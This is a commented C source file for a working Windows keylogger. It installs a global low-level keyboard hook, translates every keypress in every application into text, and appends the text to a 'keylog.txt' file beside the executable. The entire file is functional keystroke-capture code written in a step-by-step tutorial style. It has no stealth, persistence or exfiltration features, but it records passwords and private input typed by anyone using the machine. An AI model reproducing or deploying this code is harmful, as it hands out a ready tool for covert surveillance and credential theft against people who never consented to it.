// Gives access to WinAPI declarations such as SetWindowsHookEx, GetMessage, etc.
#include <windows.h>

// Used only for printf output
#include <stdio.h>

// Global hook handle.
// SetWindowsHookEx returns an HHOOK, and we store it so we can unhook later.
HHOOK g_hook;

// Initialize global log file pointer
FILE *g_log;

// Prototypes
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void log_key(DWORD vk);
int init_log_file(void);

// -----------------------------------------------------------------------------
// main: installs the keyboard hook and enters a message loop so the program stays
// alive while the hook runs.
// -----------------------------------------------------------------------------
int main(void) {

    // Initializes log file
    if (init_log_file() != 0) {
        return 1;
    }

    // Install a global low-level keyboard hook.
    // WH_KEYBOARD_LL tells Windows you want keyboard events from all processes.
    g_hook = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);

    // Check for failure
    if (g_hook == NULL) {
        printf("Failed to install hook.\n");
        return 1;
    }

    // Message loop: required so the thread stays alive.
    // GetMessage blocks until events appear.
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {}

    // Remove the hook before exiting and close log file
    fclose(g_log);
    UnhookWindowsHookEx(g_hook);
    return 0;
}

// -----------------------------------------------------------------------------
// Low-level keyboard hook callback.
// Windows calls this function on every keyboard event before it reaches apps.
//
// nCode  -> tells whether the event is valid (HC_ACTION means valid event)
// wParam -> type of keyboard message (we only care about WM_KEYDOWN)
// lParam -> pointer to a KBDLLHOOKSTRUCT containing vkCode, scan code, flags
// -----------------------------------------------------------------------------
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {

    // Only handle real keypress messages
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {

        // Cast lParam to the structure Windows gives us
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;

        // Pass vkCode to our logger function
        log_key(kb->vkCode);
    }

    // Always pass event to next hook so the system continues to function normally
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}


// -----------------------------------------------------------------------------
// log_key: handles translation of vkCodes into readable output.
// This function handles special keys directly (Enter, Tab, etc.).
// Anything else goes through ASCII/Unicode conversion.
// -----------------------------------------------------------------------------
void log_key(DWORD vk) {

    // Handle special keys first
    switch (vk) {
        case VK_RETURN:  
            fprintf(g_log, "[ENTER]\n");     
            return;
        case VK_BACK:
            fprintf(g_log, "[BACKSPACE]\n");     
            return;
        case VK_TAB:
            fprintf(g_log, "[TAB]\n");     
            fflush(g_log);
            return;
        case VK_SPACE:
            fprintf(g_log, " ");     
            fflush(g_log);
            return;

        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:
            fprintf(g_log, "[SHIFT]\n");
            fflush(g_log);
            return;

        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:
            fprintf(g_log, "[CTRL]\n"); 
            fflush(g_log);
            return;

        case VK_MENU:
        case VK_LMENU:
        case VK_RMENU:
            fprintf(g_log, "[ALT]\n");
            fflush(g_log);
            return;
    }

    // -----------------------------
    // Character translation section
    // -----------------------------

    // Array that stores 256 key states (1 byte each).
    // Contains info like whether Shift/CapsLock are active.
    BYTE state[256];
    GetKeyboardState(state);  // Fills the array with current keyboard state.

    // Convert virtual key (OS-level key number) into a scan code (hardware-level).
    UINT scan = MapVirtualKey(vk, MAPVK_VK_TO_VSC);

    // Buffer to receive the Unicode character(s)
    WCHAR buf[5] = {0};

    // Translate vkCode + scan code + key state → Unicode character.
    // result > 0 means success.
    int result = ToUnicode(vk, scan, state, buf, 4, 0);

    if (result > 0) {

        // Convert wide-char (UTF-16) to UTF-8 so printf can output it.
        char out[5];
        int len = WideCharToMultiByte(CP_UTF8, 0,
                                      buf, result,
                                      out, sizeof(out),
                                      NULL, NULL);

        out[len] = '\0';  // Null-terminate the string

        fprintf(g_log, "%s", out);
        fflush(g_log);
        return;
    }

    // If ToUnicode failed to produce a character
    fprintf(g_log, "[VK:%lu]\n", vk);
    fflush(g_log);
}

int init_log_file(void) {
    char path[MAX_PATH];
    char *last_slash;

    GetModuleFileName(NULL, path, MAX_PATH);

    last_slash = strrchr(path, '\\');
    if (last_slash) *(last_slash + 1) = '\0';

    strcat(path, "keylog.txt");

    g_log = fopen(path, "a");
    if (g_log == NULL) {
        printf("Failed to initialize log file");
        return 1;
    }
    return 0;
}